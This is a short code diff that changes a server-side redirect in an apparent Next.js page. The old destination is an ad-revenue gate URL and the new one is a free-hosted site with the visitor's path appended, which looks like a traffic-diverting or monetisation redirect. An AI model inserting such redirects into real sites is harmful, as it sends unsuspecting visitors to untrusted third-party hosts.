@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://www.highrevenuegate.com/vg8vywgw?key=816133b9582692b07ff40d879d6bf10c/`
+					`https://insuhunter.000webhostapp.com/` + encodeURI(path as string)
 				}`,
 			},
 		};
